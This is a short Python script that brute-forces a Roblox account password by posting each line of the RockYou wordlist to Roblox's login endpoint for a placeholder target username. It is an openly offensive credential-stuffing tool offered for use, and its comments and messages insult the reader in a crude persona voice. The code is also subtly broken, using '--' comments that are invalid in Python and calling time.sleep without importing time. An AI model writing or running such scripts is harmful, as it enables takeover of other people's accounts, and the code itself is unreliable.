import requests

username = "TargetUsername" -- Replace this with the username of the target, you moron.
wordlist_path = "RockYou.txt" 

def read_wordlist(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file]

def attempt_login(password):
    url = "https://auth.roblox.com/v2/login"
    payload = {
        "username": username,
        "password": password
    }
    headers = {
        "Content-Type": "application/json"
    }
    response = requests.post(url, json=payload, headers=headers)

    if response.status_code == 200:
        print(f"Password found: {password}, you little shit.")
        return True
    else:
        return False

wordlist = read_wordlist(wordlist_path)

for password in wordlist:
    if attempt_login(password):
        break
    time.sleep(1) -- Wait for 1 second before trying the next password, you idiot.

print("Password not found, you dumbass.")
